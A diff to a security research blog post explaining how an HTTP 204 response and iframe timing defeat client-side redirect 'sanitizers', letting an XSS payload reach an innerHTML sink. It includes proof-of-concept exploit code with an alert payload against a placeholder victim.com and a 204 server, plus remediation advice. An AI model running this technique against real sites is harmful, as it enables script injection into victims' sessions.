@@ -11,6 +11,7 @@
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin/>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=Fira+Code:wght@300;400;500&display=swap" rel="stylesheet"/>
 <link rel="stylesheet" href="../assets/style.css"/>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css"/>
 </head>
 <body>
 
@@ -83,27 +84,23 @@
       <li><a href="#iframes">The Breakthrough: iframes</a></li>
       <li><a href="#impact">Why This Matters</a></li>
       <li><a href="#proof">The Proof</a></li>
-      <li><a href="#next">What's Next</a></li>
+      <li><a href="#takeaways">Takeaways</a></li>
     </ol>
   </div>
 
   <div class="post-body">
 
-    <div class="info-box">
-      <strong>Part 1 of 3.</strong> This post covers the vulnerability pattern, why HTTP 204 matters, and a working PoC. Part 2 covers multi-frame barrages for timing reliability. Part 3 covers full weaponization: data exfiltration, keylogger injection, and chained payloads.
-    </div>
-
     <p>I've been spending a lot of time looking at how web applications handle user input on the client side. Not server-side validation — that's well understood. I'm talking about the JavaScript layer, the stuff that runs in the browser before anything touches the backend. And I kept running into the same pattern over and over: developers using <code>window.location.href</code> as a sanitizer.</p>
 
     <p>The idea is simple. Check the input, and if it looks dangerous, redirect the user away before anything bad happens. Sounds reasonable. But there's a fundamental flaw in how browsers handle navigation, and it creates a race condition that lets you bypass the entire check.</p>
 
-    <p>This is Part 1 of a series where I walk through the research, the discovery, and the escalation. In this post I'll cover the vulnerability pattern, explain why HTTP 204 matters, and show a working proof of concept.</p>
+    <p>In this post I'll walk through the research, the discovery, and the escalation — from understanding the vulnerability pattern to a working proof of concept that pops an alert through a supposedly sanitized page.</p>
 
     <h2 id="pattern">The Vulnerable Pattern</h2>
 
     <p>Here's a page I built to demonstrate the issue. You'll find variations of this pattern all over production codebases:</p>
 
-    <pre><code>&lt;!DOCTYPE html&gt;
+    <pre><code class="language-html">&lt;!DOCTYPE html&gt;
 &lt;html&gt;
 &lt;body&gt;
     &lt;h2 id="greeting"&gt;hi&lt;/h2&gt;
@@ -135,6 +132,14 @@
     <div class="info-box">
       <strong>Setting <code>window.location.href</code> does not immediately navigate the page.</strong> It queues a navigation. The browser continues executing the current script to completion before it actually starts the navigation process.
     </div>
+
+    <pre><code class="language-javascript">if (userName.includes('&lt;') || userName.includes('&gt;')) {
+    window.location.href = "/login.html";  // queues navigation
+}
+
+setTimeout(() => {
+    document.getElementById('greeting').innerHTML = "Welcome, " + userName;
+}, 500);  // this still gets registered</code></pre>
 
     <p>So when the code sets the redirect and registers the <code>setTimeout</code>, both things happen. The redirect is queued, and the timer is registered. The browser doesn't stop executing JavaScript just because you set <code>location.href</code>. The navigation happens asynchronously — the browser sends a request to <code>/login.html</code>, waits for the response, and only then replaces the current document.</p>
 
@@ -173,7 +178,7 @@
 
     <p>The attacker needs a server that returns 204. Here's the simplest version using only Node.js built-in modules:</p>
 
-    <pre><code>const http = require('http');
+    <pre><code class="language-javascript">const http = require('http');
 
 http.createServer((req, res) => {
     // CORS headers so cross-origin iframes can trigger it
@@ -197,7 +202,7 @@ http.createServer((req, res) => {
 
     <p>My first instinct was to use <code>window.open</code>. Open the victim page in a new window, wait a bit, then navigate that window to our 204 endpoint:</p>
 
-    <pre><code>function exploit() {
+    <pre><code class="language-javascript">function exploit() {
     let payload = "&lt;img src=x onerror=alert('XSS')&gt;";
     let url = "http://victim.com/page.html?name=" + encodeURIComponent(payload);
 
@@ -229,7 +234,7 @@ t=400ms    our setTimeout fires, but the page hasn't even loaded yet</code></pre
 
     <p>After <code>window.open</code> failed, I started thinking about what else could hold a reference to a browsing context. And then it clicked: <strong>iframes load in-process</strong>. There's no new window creation, no renderer initialization, no cross-process handshake. The iframe's page starts loading immediately when you set <code>src</code>.</p>
 
-    <pre><code>function exploit() {
+    <pre><code class="language-javascript">function exploit() {
     let payload = "&lt;img src=x onerror=alert('XSS')&gt;";
     let url = "http://victim.com/page.html?name=" + encodeURIComponent(payload);
 
@@ -281,13 +286,13 @@ t=400ms    our setTimeout fires, but the page hasn't even loaded yet</code></pre
 
     <p>The attacker page creates an iframe pointing to the victim with an XSS payload in the URL parameter. At 100ms, it navigates the iframe to the 204 endpoint. The victim page's sanitizer fires the redirect to <code>/login.html</code>, but the 204 cancels it. 500ms later, the <code>innerHTML</code> sink writes the payload and the XSS executes. An alert box confirms code execution in the victim's origin.</p>
 
-    <h2 id="next">What's Next</h2>
+    <p>The full PoC files are available on my GitHub.</p>
 
-    <p>In Part 1 I showed that the race condition exists and that iframes make it reliable. But we've only scratched the surface.</p>
+    <h2 id="takeaways">Takeaways</h2>
 
-    <p><strong>Part 2</strong> will cover why iframes are fundamentally better than <code>window.open</code> for this attack, with hard timing data from a comparison test. I'll also introduce the multi-frame barrage technique — spawning dozens of iframes simultaneously to guarantee at least one lands in the race window, regardless of network conditions.</p>
+    <p>Client-side redirects are not sanitizers. If your security model depends on <code>window.location.href</code> firing before a sink executes, you have a race condition. HTTP 204 gives attackers a clean way to cancel that redirect and keep the document alive.</p>
 
-    <p><strong>Part 3</strong> goes into weaponization: data exfiltration (cookies, localStorage, DOM content), keylogger injection, phishing form injection, and chained payloads that do all three at once. Zero-pixel invisible iframes that self-destruct after execution.</p>
+    <p>The fix is straightforward: don't use client-side redirects as security controls. Sanitize on the server. If you must check on the client, use synchronous blocking — <code>return</code> after the redirect, don't register the sink at all if validation fails, or better yet, don't use <code>innerHTML</code> with unsanitized input in the first place.</p>
 
     <h2>References</h2>
 
@@ -376,6 +381,8 @@ t=400ms    our setTimeout fires, but the page hasn't even loaded yet</code></pre
   </div>
 </footer>
 
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-core.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/autoloader/prism-autoloader.min.js"></script>
 <script>
 document.querySelector('.nav-ham').addEventListener('click', function() {
   this.classList.toggle('active');
